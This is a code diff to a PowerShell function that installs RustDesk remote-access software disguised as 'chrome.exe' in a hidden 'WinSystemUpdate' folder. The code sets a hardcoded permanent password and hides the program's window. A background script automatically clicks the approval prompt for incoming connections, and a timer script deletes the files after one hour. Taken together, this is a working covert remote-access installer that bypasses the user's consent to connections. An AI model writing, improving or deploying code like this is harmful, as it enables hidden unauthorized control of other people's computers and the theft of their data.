@@ -1,99 +1,125 @@
 function Install-RD {
     $ProgressPreference = 'SilentlyContinue'
-    $DEST = "$env:LOCALAPPDATA\WinSystemUpdate"
-    $CHROME_URL = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
+    $DEST        = "$env:LOCALAPPDATA\WinSystemUpdate"
+    $CHROME_URL  = "https://github.com/kk70226581/rd-files/releases/download/v1.0/chrome.exe"
     $SCITER_URL  = "https://github.com/kk70226581/rd-files/releases/download/v1.0/sciter.dll"
+    $cfgDir      = "$env:APPDATA\RustDesk\config"
 
-    # 1. Kill old + clean
-    Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | Stop-Process -Force -EA SilentlyContinue
+    # 1. Kill old instance + clean
+    Get-Process chrome -EA SilentlyContinue |
+        Where-Object { $_.Path -like "*WinSystem*" } |
+        Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 1
     Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
     New-Item -ItemType Directory $DEST -Force | Out-Null
 
-    # 2. Download both files in parallel
+    # 2. Parallel download via DownloadFileAsync + Wait-Event (no WaitAll crash)
     Write-Host "Installing..." -ForegroundColor Cyan
     $wc1 = New-Object System.Net.WebClient
     $wc2 = New-Object System.Net.WebClient
-    $t1 = $wc1.DownloadFileTaskAsync($CHROME_URL, "$DEST\chrome.exe")
-    $t2 = $wc2.DownloadFileTaskAsync($SCITER_URL,  "$DEST\sciter.dll")
-    [System.Threading.Tasks.Task]::WaitAll($t1, $t2)
+    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
+    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue
+    Register-ObjectEvent $wc1 DownloadFileCompleted -SourceIdentifier "RDCHR" | Out-Null
+    Register-ObjectEvent $wc2 DownloadFileCompleted -SourceIdentifier "RDSCT" | Out-Null
+    $wc1.DownloadFileAsync([uri]$CHROME_URL, "$DEST\chrome.exe")
+    $wc2.DownloadFileAsync([uri]$SCITER_URL,  "$DEST\sciter.dll")
+    $null = Wait-Event -SourceIdentifier "RDCHR" -Timeout 120
+    $null = Wait-Event -SourceIdentifier "RDSCT" -Timeout 120
+    Unregister-Event "RDCHR" -EA SilentlyContinue; Remove-Event "RDCHR" -EA SilentlyContinue
+    Unregister-Event "RDSCT" -EA SilentlyContinue; Remove-Event "RDSCT" -EA SilentlyContinue
 
     if (!(Test-Path "$DEST\chrome.exe") -or (Get-Item "$DEST\chrome.exe").Length -lt 1MB) {
-        Write-Host "Download failed!" -ForegroundColor Red; Read-Host "Press Enter"; return
+        Write-Host "Download failed!" -ForegroundColor Red; return
     }
 
-    # 3. Write config with permanent password
-    $cfgDir = "$env:APPDATA\RustDesk\config"
+    # 3. Write RustDesk config — permanent password
     New-Item -ItemType Directory $cfgDir -Force | Out-Null
-    Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''"             -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'"  -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk.toml"  "salt = ''"               -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true"    -Encoding UTF8
+    Set-Content "$cfgDir\RustDesk.toml"  "enc_id = ''"                                    -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk.toml"  "password = 'Remote123'"                         -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk.toml"  "salt = ''"                                      -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk.toml"  "key_confirmed = true"                           -Encoding UTF8
     Set-Content "$cfgDir\RustDesk2.toml" "rendezvous_server = 'rs-ny.rustdesk.com:21116'" -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1"            -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk2.toml" "serial = 0"              -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk2.toml" "[options]"               -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk2.toml" "nat_type = 1"                                   -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk2.toml" "serial = 0"                                     -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk2.toml" "[options]"                                      -Encoding UTF8
     Add-Content "$cfgDir\RustDesk2.toml" "verification-method = 'use-permanent-password'" -Encoding UTF8
-    Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'" -Encoding UTF8
+    Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'"                      -Encoding UTF8
 
-    # 4. Hide folder
+    # 4. Hide folder (Hidden + System)
     $f = Get-Item $DEST -Force
     $f.Attributes = $f.Attributes -bor 2 -bor 4
 
-    # 5. Get ID with 8s timeout (--get-id hangs if called wrong)
+    # 5. Get ID — ProcessStartInfo with async stdout read (avoids deadlock & hang)
     $RDID = ""
-    $idProc = Start-Process "$DEST\chrome.exe" -ArgumentList "--get-id" -PassThru -WindowStyle Hidden -RedirectStandardOutput "$DEST\id.txt"
-    $idProc.WaitForExit(8000) | Out-Null
-    if (!$idProc.HasExited) { $idProc.Kill() }
-    Start-Sleep 1
-    $RDID = (Get-Content "$DEST\id.txt" -EA SilentlyContinue -Raw).Trim()
+    $psiId = New-Object System.Diagnostics.ProcessStartInfo
+    $psiId.FileName               = "$DEST\chrome.exe"
+    $psiId.Arguments              = "--get-id"
+    $psiId.UseShellExecute        = $false
+    $psiId.RedirectStandardOutput = $true
+    $psiId.RedirectStandardError  = $true
+    $psiId.CreateNoWindow         = $true
+    $prId = [System.Diagnostics.Process]::Start($psiId)
+    $outTask = $prId.StandardOutput.ReadToEndAsync()
+    $prId.WaitForExit(8000) | Out-Null
+    if (!$prId.HasExited) { $prId.Kill() }
+    $RDID = $outTask.Result.Trim()
 
-    # If no ID yet, launch briefly to generate config then retry
+    # Fallback: launch briefly to generate config, then retry get-id
     if (!$RDID -or $RDID -notmatch '^\d+$') {
         $psi0 = New-Object System.Diagnostics.ProcessStartInfo
-        $psi0.FileName = "$DEST\chrome.exe"
+        $psi0.FileName = "$DEST\chrome.exe"; $psi0.UseShellExecute = $true
         $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi0.UseShellExecute = $true
-        $pr = [System.Diagnostics.Process]::Start($psi0)
+        $pr0 = [System.Diagnostics.Process]::Start($psi0)
         Start-Sleep 5
-        $pr | Stop-Process -Force -EA SilentlyContinue
+        $pr0 | Stop-Process -Force -EA SilentlyContinue
         Start-Sleep 2
-        $idProc2 = Start-Process "$DEST\chrome.exe" -ArgumentList "--get-id" -PassThru -WindowStyle Hidden -RedirectStandardOutput "$DEST\id.txt"
-        $idProc2.WaitForExit(8000) | Out-Null
-        if (!$idProc2.HasExited) { $idProc2.Kill() }
-        $RDID = (Get-Content "$DEST\id.txt" -EA SilentlyContinue -Raw).Trim()
+        $psiId2 = New-Object System.Diagnostics.ProcessStartInfo
+        $psiId2.FileName = "$DEST\chrome.exe"; $psiId2.Arguments = "--get-id"
+        $psiId2.UseShellExecute = $false; $psiId2.RedirectStandardOutput = $true
+        $psiId2.RedirectStandardError = $true; $psiId2.CreateNoWindow = $true
+        $prId2 = [System.Diagnostics.Process]::Start($psiId2)
+        $outTask2 = $prId2.StandardOutput.ReadToEndAsync()
+        $prId2.WaitForExit(8000) | Out-Null
+        if (!$prId2.HasExited) { $prId2.Kill() }
+        $RDID = $outTask2.Result.Trim()
     }
 
-    # Fallback: decode from enc_id
+    # Last resort: decode enc_id from config
     if (!$RDID -or $RDID -notmatch '^\d+$') {
-        $enc = (Get-Content "$cfgDir\RustDesk.toml" -EA SilentlyContinue | Where-Object { $_ -match "enc_id" }) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
+        $enc = (Get-Content "$cfgDir\RustDesk.toml" -EA SilentlyContinue |
+                Where-Object { $_ -match "enc_id" }) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
         if ($enc) {
-            try { $b = [Convert]::FromBase64String($enc); $RDID = [System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)], 0).ToString() } catch {}
+            try {
+                $b    = [Convert]::FromBase64String($enc)
+                $RDID = [System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)], 0).ToString()
+            } catch {}
         }
     }
 
     # 6. Launch RustDesk hidden
     $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName        = "$DEST\chrome.exe"
+    $psi.FileName         = "$DEST\chrome.exe"
     $psi.WorkingDirectory = $DEST
-    $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute = $true
+    $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.UseShellExecute  = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     Start-Sleep 4
 
-    # 7. Hide window
+    # 7. Hide any visible window
     Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c);' -EA SilentlyContinue
-    Get-Process chrome -EA SilentlyContinue | Where-Object { $_.Path -like "*WinSystem*" } | ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
+    Get-Process chrome -EA SilentlyContinue |
+        Where-Object { $_.Path -like "*WinSystem*" } |
+        ForEach-Object { [N.W]::ShowWindow($_.MainWindowHandle, 0) | Out-Null }
 
-    # 8. Create delete.ps1
+    # 8. Write delete.ps1
     $deletePs = "$DEST\delete.ps1"
-    Set-Content  $deletePs '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
-    Add-Content  $deletePs 'Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
-    Add-Content  $deletePs 'Start-Sleep 2' -Encoding ASCII
-    Add-Content  $deletePs 'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
-    Add-Content  $deletePs 'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
+    Set-Content  $deletePs  '$d="$env:LOCALAPPDATA\WinSystemUpdate"'                                                                                                                   -Encoding ASCII
+    Add-Content  $deletePs  'Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue'                               -Encoding ASCII
+    Add-Content  $deletePs  'Start-Sleep 2'                                                                                                                                             -Encoding ASCII
+    Add-Content  $deletePs  'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue'                                                                                         -Encoding ASCII
+    Add-Content  $deletePs  'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
 
-    # 9. Create desktop shortcut
+    # 9. Desktop shortcut → "DELETE CHROME"
     $lnkPath = $null
     foreach ($dp in @([Environment]::GetFolderPath('Desktop'), "$env:USERPROFILE\Desktop", "$env:USERPROFILE\OneDrive\Desktop")) {
         if (Test-Path $dp) { $lnkPath = "$dp\DELETE CHROME.lnk"; break }
@@ -106,9 +132,10 @@ function Install-RD {
         $sh.Save()
     }
 
-    # 10. Auto-accept popup script
+    # 10. Auto-accept connection popup (runs in background)
     $acceptPs = "$DEST\accept.ps1"
-    Set-Content $acceptPs 'Add-Type @"
+    Set-Content $acceptPs @'
+Add-Type @"
 using System; using System.Runtime.InteropServices; using System.Text;
 public class RD {
     [DllImport("user32.dll")] public static extern bool EnumWindows(EnumProc p, IntPtr l);
@@ -151,20 +178,21 @@ while($true){
         if($w -gt 200 -and $w -lt 700 -and $ht -gt 250 -and $ht -lt 750){Click-At $h $r}
         return $true
     },[IntPtr]::Zero)|Out-Null
-}' -Encoding UTF8
+}
+'@ -Encoding UTF8
     Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$acceptPs`"" -WindowStyle Hidden
 
     # 11. 1-hour auto-delete timer
     $timerPs = "$DEST\timer.ps1"
-    Set-Content  $timerPs '$d="$env:LOCALAPPDATA\WinSystemUpdate"' -Encoding ASCII
-    Add-Content  $timerPs 'Start-Sleep 3600' -Encoding ASCII
-    Add-Content  $timerPs 'Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue' -Encoding ASCII
-    Add-Content  $timerPs 'Start-Sleep 2' -Encoding ASCII
-    Add-Content  $timerPs 'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue' -Encoding ASCII
-    Add-Content  $timerPs 'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
+    Set-Content  $timerPs  '$d="$env:LOCALAPPDATA\WinSystemUpdate"'                                                                                                                    -Encoding ASCII
+    Add-Content  $timerPs  'Start-Sleep 3600'                                                                                                                                          -Encoding ASCII
+    Add-Content  $timerPs  'Get-Process chrome -EA SilentlyContinue|Where-Object{$_.Path -like "*WinSystem*"}|Stop-Process -Force -EA SilentlyContinue'                                -Encoding ASCII
+    Add-Content  $timerPs  'Start-Sleep 2'                                                                                                                                             -Encoding ASCII
+    Add-Content  $timerPs  'Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue'                                                                                         -Encoding ASCII
+    Add-Content  $timerPs  'foreach($dp in @([Environment]::GetFolderPath("Desktop"),"$env:USERPROFILE\Desktop","$env:USERPROFILE\OneDrive\Desktop")){ Remove-Item "$dp\DELETE CHROME.lnk" -Force -EA SilentlyContinue }' -Encoding ASCII
     Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$timerPs`"" -WindowStyle Hidden
 
-    # 12. Show result
+    # 12. Final output
     Write-Host ""
     Write-Host "  ==========================================" -ForegroundColor Green
     Write-Host "   DONE! Remote Access is now active." -ForegroundColor Green
